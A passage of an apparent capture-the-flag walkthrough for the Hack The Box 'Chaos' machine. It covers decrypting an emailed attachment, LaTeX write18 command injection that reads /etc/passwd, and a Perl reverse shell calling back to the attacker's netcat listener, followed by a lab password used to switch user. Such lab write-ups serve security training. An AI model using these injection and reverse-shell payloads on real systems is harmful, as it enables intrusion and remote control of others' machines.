+                *&nbsp;1&nbsp;FETCH&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>BODY[]&nbsp;<span style="color:#ff9d00;font-weight:700">{</span>2532<span style="color:#ff9d00;font-weight:700">}</span><br>
+                MIME-Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1.0<br>
+                Content-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;multipart<span style="color:#ff9d00;font-weight:700">/</span>mixed<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">boundary</span>=<span style="color:#3ad900;font-weight:400">"=_00b34a28b9033c43ed09c0950f4176e1"</span><br>
+                Date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Sun,&nbsp;28&nbsp;Oct&nbsp;2018&nbsp;17<span style="color:#ff9d00;font-weight:700">:</span>46<span style="color:#ff9d00;font-weight:700">:</span>38&nbsp;+0530<br>
+                From<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ayush&nbsp;&lt;ayush@localhost&gt;<br>
+                To<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;undisclosed-recipients<span style="color:#ff9d00;font-weight:700">:;</span><br>
+                Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;service<br>
+                Message-ID<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&lt;7203426a8678788517ce8d28103461bd@webmail.chaos.htb&gt;<br>
+                X-Sender<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;ayush@localhost<br>
+                User-Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Roundcube&nbsp;Webmail<span style="color:#ff9d00;font-weight:700">/</span>1.3.8<br>
+                <br>
+                --=_00b34a28b9033c43ed09c0950f4176e1<br>
+                Content-Transfer-Encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;7bit<br>
+                Content-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;text<span style="color:#ff9d00;font-weight:700">/</span>plain<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;charset=US-ASCII<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">format</span>=flowed<br>
+                <br>
+                Hii,&nbsp;sahay<br>
+                Check&nbsp;the&nbsp;enmsg.txt<br>
+                You&nbsp;are&nbsp;the&nbsp;password&nbsp;XD.<br>
+                Also&nbsp;attached&nbsp;the&nbsp;script&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;i&nbsp;used&nbsp;to&nbsp;encrypt.<br>
+                Thanks,<br>
+                Ayush<br>
+                <br>
+                --=_00b34a28b9033c43ed09c0950f4176e1<br>
+                Content-Transfer-Encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;base64<br>
+                Content-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;application<span style="color:#ff9d00;font-weight:700">/</span>octet-stream<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">name</span>=enim_msg.txt<br>
+                Content-Disposition<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;attachment<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">filename</span>=enim_msg.txt<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">size</span>=272<br>
+                <br>
+                MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw<span style="color:#ff9d00;font-weight:700">/</span>AldQmd<span style="color:#ff9d00;font-weight:700">/</span>g53L6pgva9<br>
+                RdPkJ3GSW57onvseOe5ai95<span style="color:#ff9d00;font-weight:700">/</span>M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M<br>
+                7Y2mM6I+lH0zQb6Xt<span style="color:#ff9d00;font-weight:700">/</span>JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e<br>
+                6Hq7AUnTxcMsqqLdqEL5+<span style="color:#ff9d00;font-weight:700">/</span>px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE<span style="color:#ff9d00;font-weight:700">/</span>LS10yge<br>
+                +l6ON4g1fpYizywI3+h9l5Iwpj<span style="color:#ff9d00;font-weight:700">/</span>UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=<br>
+                --=_00b34a28b9033c43ed09c0950f4176e1<br>
+                Content-Transfer-Encoding<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;base64<br>
+                Content-Type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;text<span style="color:#ff9d00;font-weight:700">/</span>x-python<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;charset=us-ascii<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">name</span>=en.py<br>
+                Content-Disposition<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;attachment<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">filename</span>=en.py<span style="color:#ff9d00;font-weight:700">;</span><br>
+                &nbsp;<span style="color:#7f0044;font-weight:400">size</span>=804<br>
+                <br>
+                ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBv<br>
+                dXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdl<br>
+                dHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikK<br>
+                CiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRo<br>
+                IG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0<br>
+                RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6<br>
+                ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAg<br>
+                ICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVu<br>
+                a3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAg<br>
+                ICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgog<br>
+                ICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2<br>
+                KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5r<br>
+                KSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3<br>
+                KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdl<br>
+                c3QoKQoK<br>
+                --=_00b34a28b9033c43ed09c0950f4176e1--<br>
+                <span style="color:#ff9d00;font-weight:700">)</span><br>
+                a&nbsp;OK&nbsp;Fetch&nbsp;completed&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>0.002&nbsp;+&nbsp;0.000&nbsp;+&nbsp;0.001&nbsp;secs<span style="color:#ff9d00;font-weight:700">)</span>.
+            </div>
+        </div><br>
+        <br>
+        We find an interesting email with 2 interesting attachments - <code>enim-msg.txt</code> and <code>en.py</code><br>
+        If you look at the ‘Content-Transfer-Encoding’ header, you'll see that the attachments are base64 encoded.<br>
+        <br>
+        Copy/paste the base64 strings (1st attachment ends in - <code>R08=</code>, 2nd attachment ends in <code>KQoK</code>) into their own files on your attacking machine and base64 decode them:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;nano&nbsp;enim_msg.txt.b64<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;enim_msg.txt.b64&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;enim_msg.txt<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;enim_msg.txt<br>
+                enim_msg.txt<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;data<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;nano&nbsp;en.py.b64<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;en.py.b64&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;en.py
+            </div>
+        </div><br>
+        <br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Decrypt enim_msg.txt</strong></h2><br>
+        Reading the email we see that we've been given an encrypted file, the script used to encrypt said file, and that said file has been encrypted with the password “sahay›<br>
+            <div class="codebox">
+                Hii,&nbsp;sahay<br>
+                Check&nbsp;the&nbsp;enmsg.txt<br>
+                You&nbsp;are&nbsp;the&nbsp;password&nbsp;XD.<br>
+                Also&nbsp;attached&nbsp;the&nbsp;script&nbsp;which&nbsp;i&nbsp;used&nbsp;to&nbsp;encrypt.<br>
+                Thanks,<br>
+                Ayush
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>4a) Modify en.py</strong></h3><br>
+        Time to decrypt to enim_msg.txt.<br>
+        You actually only have to change 1 line in the <code>en.py</code> script (and include the necessary libraries) to decrypt the file since the script uses a library to encrypt and not self written.<br>
+        Change <code>outfile.write(encryptor.encrypt(chunk))</code> to <code>outfile.write(encryptor.decrypt(chunk))</code><br>
+        <br>
+        BUT, I made some extra changes just for clarity and when figuring out how it works.<br>
+        <br>
+        <strong>1)</strong> Import necessary libraries:<br>
+        <code>import os<br>
+        from Crypto.Cipher import AES<br>
+        from Crypto.Hash import SHA256<br>
+        from Crypto import Random</code><br>
+        <br>
+        <strong>2)</strong> Change the name of the output file:<br>
+        <code>outputFile =</code> <code><span style="color:#a31515;">"dec_"</span></code> <code>+ filename</code><br>
+        <br>
+        <strong>3)</strong> Rename ‘encryptor’ to ‘decryptor’, just for clarity:<br>
+        <code>decryptor = AES.new(key, AES.MODE_CBC, IV)</code><br>
+        <br>
+        <strong>4)</strong> Use new ‘decryptor’ variable and use decrypt, not encrypt<br>
+        <code>outfile.write(decryptor.decrypt(chunk))</code><br>
+        <br>
+        <strong>5)</strong> Run the decrypt function<br>
+        <code>decrypt(getKey(</code><code><span style="color:#a31515;">"sahay"</span></code><code>),</code> <code><span style="color:#a31515;">"enim_msg.txt"</span></code><code>)</code><br>
+        <br>
+        The final script looked like this:<br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;os<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;Crypto.Cipher&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;AES<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;Crypto.Hash&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;SHA256<br>
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;Crypto&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;Random<br>
+                <br>
+                def&nbsp;decrypt(key,&nbsp;filename):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;chunksize&nbsp;=&nbsp;<span style="color:#ff0044;font-weight:400">64</span>*<span style="color:#ff0044;font-weight:400">1024</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;outputFile&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"dec_"</span>&nbsp;+&nbsp;filename<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;filesize&nbsp;=&nbsp;str(os.path.getsize(filename)).zfill(<span style="color:#ff0044;font-weight:400">16</span>)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;IV&nbsp;=&nbsp;Random.new().read(<span style="color:#ff0044;font-weight:400">16</span>)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;decryptor&nbsp;=&nbsp;AES.new(key,&nbsp;AES.MODE_CBC,&nbsp;IV)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(filename,&nbsp;<span style="color:#3ad900;font-weight:400">'rb'</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;infile:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(outputFile,&nbsp;<span style="color:#3ad900;font-weight:400">'wb'</span>)&nbsp;<span style="color:#333333;font-weight:400">as</span>&nbsp;outfile:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outfile.write(filesize.encode(<span style="color:#3ad900;font-weight:400">'utf-8'</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outfile.write(IV)<br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;<span style="color:#ff0044;font-weight:400">True</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chunk&nbsp;=&nbsp;infile.read(chunksize)<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(chunk)&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;len(chunk)&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">16</span>&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:400">0</span>:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chunk&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">b'&nbsp;'</span>&nbsp;*&nbsp;(<span style="color:#ff0044;font-weight:400">16</span>&nbsp;-&nbsp;(len(chunk)&nbsp;%&nbsp;<span style="color:#ff0044;font-weight:400">16</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outfile.write(decryptor.decrypt(chunk))<br>
+                <br>
+                def&nbsp;getKey(password):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;hasher&nbsp;=&nbsp;SHA256.new(password.encode(<span style="color:#3ad900;font-weight:400">'utf-8'</span>))<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;hasher.digest()<br>
+                <br>
+                decrypt(getKey(<span style="color:#3ad900;font-weight:400">"sahay"</span>),&nbsp;<span style="color:#3ad900;font-weight:400">"enim_msg.txt"</span>)
+            </div>
+        </div><br>
+        <br>
+        Alternatively you could just google parts of the script and you'll find the whole thing on github - <a href="https://github.com/argosk/encrypt-Python/blob/master/encrypt.py">https://github.com/argosk/encrypt-Python/blob/master/encrypt.py</a><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>4b) Decryption</strong></h3><br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>993imap#&nbsp;python3&nbsp;decrypt.py<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>993imap#&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
+                dec_enim_msg.txt&nbsp;&nbsp;decrypt.py&nbsp;&nbsp;enim_msg.txt&nbsp;&nbsp;enim_msg.txt.b64&nbsp;&nbsp;en.py&nbsp;&nbsp;en.py.b64<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>993imap#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;dec_enim_msg.txt&nbsp;<br>
+                0000000000000272�R�3ν��]�<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;����<span style="color:#ff9d00;font-weight:700">:</span>�UP��%��Þ�š�TW�sLPOg���SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK
+            </div>
+        </div><br>
+        <br>
+        There's an obvious base64 string in the decrypted <code>enim_msg.txt</code>, and thankfully it's the message!<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>993imap#&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"SGlpIFNhaGF5CgpQbGVhc2UgY2hlY2sgb3VyIG5ldyBzZXJ2aWNlIHdoaWNoIGNyZWF0ZSBwZGYKCnAucyAtIEFzIHlvdSB0b2xkIG1lIHRvIGVuY3J5cHQgaW1wb3J0YW50IG1zZywgaSBkaWQgOikKCmh0dHA6Ly9jaGFvcy5odGIvSjAwX3cxbGxfZjFOZF9uMDdIMW45X0gzcjMKClRoYW5rcywKQXl1c2gK"</span>&nbsp;&gt;&nbsp;enim_msg_dec.b64<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>993imap#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;enim_msg_dec.b64&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;base64&nbsp;-d&nbsp;&gt;&nbsp;enim_msg_PLAIN.txt<br>
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos<span style="color:#ff9d00;font-weight:700">/</span>993imap#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;enim_msg_PLAIN.txt&nbsp;<br>
+                Hii&nbsp;Sahay<br>
+                <br>
+                Please&nbsp;check&nbsp;our&nbsp;new&nbsp;service&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;create&nbsp;pdf<br>
+                <br>
+                p.s&nbsp;-&nbsp;As&nbsp;you&nbsp;told&nbsp;me&nbsp;to&nbsp;encrypt&nbsp;important&nbsp;msg,&nbsp;i&nbsp;did&nbsp;<span style="color:#ff9d00;font-weight:700">:</span>)<br>
+                <br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>chaos.htb<span style="color:#ff9d00;font-weight:700">/</span>J00_w1ll_f1Nd_n07H1n9_H3r3<br>
+                <br>
+                Thanks,<br>
+                Ayush
+            </div>
+        </div><br>
+        <br>
+        Back to chaos.htb.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) /J00_w1ll_f1Nd_n07H1n9_H3r3</strong></h2><br>
+        <a href="http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/">http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/</a><br>
+        <br>
+        So it looks like this is an unfinished part of the site that creates PDFs.<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        And examinig this in burp after creating a PDF it looks like it's running pdfTeX, which is part of LaTeX.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        web-based LaTeX compilers are vulnerable to command injection because they take user input - <a href="https://0day.work/hacking-with-latex/">https://0day.work/hacking-with-latex/</a><br>
+        <br>
+        First test for command injection by reading /etc/passwd.<br>
+        <code>\immediate\write18{cat /etc/passwd}</code><br>
+        <br>
+            <div class="codebox">
+                root:x:0:0:root:/root:/bin/bash<br>
+                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
+                bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
+                sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>
+                sync:x:4:65534:sync:/bin:/bin/sync<br>
+                games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>
+                man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>
+                lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>
+                mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>
+                news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>
+                uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>
+                proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>
+                www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>
+                backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>
+                list:x:38:38:Mailing&nbsp;List&nbsp;Manager:/var/list:/usr/sbin/nologin<br>
+                irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>
+                gnats:x:41:41:Gnats&nbsp;Bug-Reporting&nbsp;System&nbsp;(admin):/var/lib/gnats:/usr/sbin/nologin<br>
+                nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>
+                systemd-timesync:x:100:102:systemd&nbsp;Time&nbsp;Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>
+                systemd-network:x:101:103:systemd&nbsp;Network&nbsp;Management,,,:/run/systemd:/usr/sbin/nologin<br>
+                systemd-resolve:x:102:104:systemd&nbsp;Resolver,,,:/run/systemd:/usr/sbin/nologin<br>
+                syslog:x:103:108::/home/syslog:/usr/sbin/nologin<br>
+                _apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>
+                messagebus:x:105:109::/nonexistent:/usr/sbin/nologin<br>
+                uuidd:x:106:111::/run/uuidd:/usr/sbin/nologin<br>
+                landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin<br>
+                pollinate:x:108:1::/var/cache/pollinate:/bin/false<br>
+                systemd-coredump:x:998:998:systemd&nbsp;Core&nbsp;Dumper:/:/sbin/nologin<br>
+                sahay:x:1000:1000:choas:/home/sahay:/bin/bash<br>
+                lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br>
+                mysql:x:110:115:MySQL&nbsp;Server,,,:/nonexistent:/bin/false<br>
+                ayush:x:1001:1001:,,,:/home/ayush:/opt/rbash<br>
+                postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin<br>
+                dovecot:x:112:118:Dovecot&nbsp;mail&nbsp;server,,,:/usr/lib/dovecot:/usr/sbin/nologin<br>
+                dovenull:x:113:119:Dovecot&nbsp;login&nbsp;user,,,:/nonexistent:/usr/sbin/nologin
+            </div>
+        </div><br>
+        <br>
+        You can see the result of the command in the response from the web server.<br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        If you're not using burp (but you should, it makes your life a lot easier) - F12 to open up developer tools, network tab, create your PDF/run command injection and in the response to the POST request you'll find the result.<br>
+        <br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Since we can execute system commands, we should be able to get a reverse shell,<br>
+        <br>
+        Prep to receive the shell:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chaos#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        A perl reverse shell was what worked for me (after trial and error with bash and nc):<br>
+        <code>\immediate\write18{perl -e 'use Socket;$i="10.10.13.44";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'}</code><br>
+        <br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        A shell!<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) www-data to user.txt</strong></h2><br>
+        Upgrade your shell using python so we can run interactive commands (like <code>su</code>):<br>
+            <div class="codebox">
+                ...<br>
+                connect&nbsp;to&nbsp;[10.10.13.44]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.120]&nbsp;55286<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh:</span>&nbsp;0<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;can<span style="color:#3ad900;font-weight:400">'t&nbsp;access&nbsp;tty;&nbsp;job&nbsp;control&nbsp;turned&nbsp;off<br>
+                $&nbsp;python&nbsp;-c&nbsp;'</span>import&nbsp;pty<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;pty.spawn<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">"/bin/bash"</span><span style="color:#ff9d00;font-weight:700">)</span><span style="color:#3ad900;font-weight:400">'&nbsp;</span>
+            </div>
+        </div><br>
+        <br>
+        Switch user to ayush (we know that ayush is a user from reading /etc/passwd and we got the creds for their account from wordpress):<br>
+            <div class="codebox">
+                www-data@chaos<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>main<span style="color:#ff9d00;font-weight:700">/</span>J00_w1ll_f1Nd_n07H1n9_H3r3<span style="color:#ff9d00;font-weight:700">/</span>compile$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;ayush<br>
+                <span style="color:#ff9d00;font-weight:700">su</span>&nbsp;ayush<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;jiujitsu
+            </div>
+        </div><br>
+        <br>
+        You'll quickly realise that you're in a restrcited shell, specifically rbash (you can see this coming if you read through /etc/passwd).<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>6b) Escape restricted shell</strong></h3><br>
+        Thankfully, we can escape the restricted shell using tar.<br>
